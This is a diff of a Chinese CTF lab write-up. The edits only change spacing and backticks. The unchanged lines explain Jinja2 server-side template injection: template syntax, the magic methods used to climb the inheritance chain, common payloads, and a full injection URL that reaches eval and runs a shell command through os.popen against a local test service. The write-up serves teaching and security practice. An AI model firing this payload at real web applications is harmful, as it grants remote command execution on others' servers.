@@ -85,15 +85,15 @@ sudo nmap -n -PN -sT -sU -p- 127.0.0.1
 
 ### 寻找 flag
 
-在构建恶意命令前，我们先了解一些SSTI漏洞的尝试和利用形式，以方便我们之后的步骤。
+在构建恶意命令前，我们先了解一些 SSTI 漏洞的尝试和利用形式，以方便我们之后的步骤。
 
-- Jinjia模板特点
+- Jinjia 模板特点
   
       {{...}}: 装载一个变量，模板渲染时，会使用传进来的同名参数变量的代表值替换
       {%...%}: 装载一个控制语句
       {#...#}: 装载一个注释，模板渲染的时候会忽视这中间的值
 
-- Jinja2中for循环的内置常量
+- Jinja2 中 for 循环的内置常量
   
   | 常量          | 说明                            |
   | ----------- | ----------------------------- |
@@ -102,7 +102,7 @@ sudo nmap -n -PN -sT -sU -p- 127.0.0.1
   | loop.last   | 是否是最后一次迭代，返回`true` or `false` |
   | loop.length | 序列的长度                         |
 
-- 由于在jinja2中是可以直接访问python的一些对象及其方法的，所以我们可以通过构造继承链来执行一些操作，比如文件读取，命令执行等
+- 由于在 jinja2 中是可以直接访问 python 的一些对象及其方法的，所以我们可以通过构造继承链来执行一些操作，比如文件读取，命令执行等
   
   | 魔术方法             | 说明                                   |
   | ---------------- | ------------------------------------ |
@@ -115,7 +115,7 @@ sudo nmap -n -PN -sT -sU -p- 127.0.0.1
   | `__globals__`    | 函数会以字典类型放回当前位置的全部全局变量与func_globals等价 |
   | `__bases__`      | 返回该对象所继承的类型列表                        |
 
-- 一些常用的payload
+- 一些常用的 payload
   
       //获取基本类
       ''.__class__.__mro__[1]
@@ -154,7 +154,7 @@ sudo nmap -n -PN -sT -sU -p- 127.0.0.1
    我们进一步来看看这个文件夹下有什么东西：
    
    ```
-   # 显示 /flag 中的文件
+   # 显示 `/flag` 中的文件
    http://127.0.0.1:11451/index/?content={% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__("os").popen("ls /flag").read()') }}{% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %}
    ```
    
@@ -168,7 +168,7 @@ sudo nmap -n -PN -sT -sU -p- 127.0.0.1
    
    ![find_flag-3](img/search_flag-3.png)
    
-   找到 flag 为 `flag{flag_test}` , break it 环节到此结束。
+   如上图，找到 flag 为 `flag{flag_test}` , break it 环节到此结束。
 
 > 注：exp 代码运行结果：
 > 
